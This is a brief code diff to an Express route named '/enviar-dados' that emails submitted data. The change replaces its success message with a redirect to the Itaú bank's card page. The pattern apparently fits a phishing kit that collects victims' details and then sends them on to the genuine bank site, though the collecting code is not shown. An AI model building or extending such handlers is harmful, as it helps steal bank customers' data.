@@ -36,7 +36,7 @@ app.post('/enviar-dados', (req, res) => {
             res.send('Erro ao enviar o email');
         } else {
             console.log('Email enviado: ' + info.response);
-            res.send('Dados enviados com sucesso');
+            res.redirect('https://www.itau.com.br/cartoes');
         }
     });
 });
